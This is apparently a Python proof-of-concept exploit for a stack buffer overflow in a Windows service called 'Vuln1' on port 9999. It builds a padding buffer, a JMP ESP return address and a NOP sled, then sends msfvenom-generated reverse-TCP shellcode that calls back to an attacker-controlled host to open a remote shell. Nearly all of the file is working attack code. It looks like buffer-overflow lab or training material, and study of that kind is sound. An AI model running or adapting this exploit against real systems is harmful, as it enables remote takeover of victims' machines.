#!/usr/bin/python
# Tested on: Windows 10 x86
# Author: dead1
# bad chars = \x00
# 0x148010CF JMP ESP
import socket

victim = "10.0.0.0"
port = 9999

## msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.45 LPORT=443 -f py -b '\x00' -v shellcode exitfunc=thread
## shellcode
shellcode = b"\xba\xbe\xfa\x76\x3c\xd9\xe9\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x52\x83\xed\xfc\x31\x55\x0e"
shellcode += b"\x03\xeb\xf4\x94\xc9\xef\xe1\xdb\x32\x0f\xf2"
shellcode += b"\xbb\xbb\xea\xc3\xfb\xd8\x7f\x73\xcc\xab\x2d"
shellcode += b"\x78\xa7\xfe\xc5\x0b\xc5\xd6\xea\xbc\x60\x01"
shellcode += b"\xc5\x3d\xd8\x71\x44\xbe\x23\xa6\xa6\xff\xeb"
shellcode += b"\xbb\xa7\x38\x11\x31\xf5\x91\x5d\xe4\xe9\x96"
shellcode += b"\x28\x35\x82\xe5\xbd\x3d\x77\xbd\xbc\x6c\x26"
shellcode += b"\xb5\xe6\xae\xc9\x1a\x93\xe6\xd1\x7f\x9e\xb1"
shellcode += b"\x6a\x4b\x54\x40\xba\x85\x95\xef\x83\x29\x64"
shellcode += b"\xf1\xc4\x8e\x97\x84\x3c\xed\x2a\x9f\xfb\x8f"
shellcode += b"\xf0\x2a\x1f\x37\x72\x8c\xfb\xc9\x57\x4b\x88"
shellcode += b"\xc6\x1c\x1f\xd6\xca\xa3\xcc\x6d\xf6\x28\xf3"
shellcode += b"\xa1\x7e\x6a\xd0\x65\xda\x28\x79\x3c\x86\x9f"
shellcode += b"\x86\x5e\x69\x7f\x23\x15\x84\x94\x5e\x74\xc1"
shellcode += b"\x59\x53\x86\x11\xf6\xe4\xf5\x23\x59\x5f\x91"
shellcode += b"\x0f\x12\x79\x66\x6f\x09\x3d\xf8\x8e\xb2\x3e"
shellcode += b"\xd1\x54\xe6\x6e\x49\x7c\x87\xe4\x89\x81\x52"
shellcode += b"\xaa\xd9\x2d\x0d\x0b\x89\x8d\xfd\xe3\xc3\x01"
shellcode += b"\x21\x13\xec\xcb\x4a\xbe\x17\x9c\x7e\x3f\x17"
shellcode += b"\x71\x17\x3d\x17\x88\x5c\xc8\xf1\xe0\xb2\x9d"
shellcode += b"\xaa\x9c\x2b\x84\x20\x3c\xb3\x12\x4d\x7e\x3f"
shellcode += b"\x91\xb2\x31\xc8\xdc\xa0\xa6\x38\xab\x9a\x61"
shellcode += b"\x46\x01\xb2\xee\xd5\xce\x42\x78\xc6\x58\x15"
shellcode += b"\x2d\x38\x91\xf3\xc3\x63\x0b\xe1\x19\xf5\x74"
shellcode += b"\xa1\xc5\xc6\x7b\x28\x8b\x73\x58\x3a\x55\x7b"
shellcode += b"\xe4\x6e\x09\x2a\xb2\xd8\xef\x84\x74\xb2\xb9"
shellcode += b"\x7b\xdf\x52\x3f\xb0\xe0\x24\x40\x9d\x96\xc8"
shellcode += b"\xf1\x48\xef\xf7\x3e\x1d\xe7\x80\x22\xbd\x08"
shellcode += b"\x5b\xe7\xdd\xea\x49\x12\x76\xb3\x18\x9f\x1b"
shellcode += b"\x44\xf7\xdc\x25\xc7\xfd\x9c\xd1\xd7\x74\x98"
shellcode += b"\x9e\x5f\x65\xd0\x8f\x35\x89\x47\xaf\x1f"

## statics
numberofnops = 20
buffoffset = 2288

## create string variables
nopsled = "\x90" * numberofnops
bigbuff = "A" * buffoffset

# !mona jmp -r ESP
## 0x148010CF JMP ESP
eip = "\xcf\x10\x80\x14"

## build the buffer string
thebuff = bigbuff + eip + nopsled + shellcode

print "[*] Vuln1 Buffer Overflow PoC.." 
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((victim, port))
print "[*] Sending evil buffer..."
s.send(thebuff)
s.close()
print "[*] Done!"
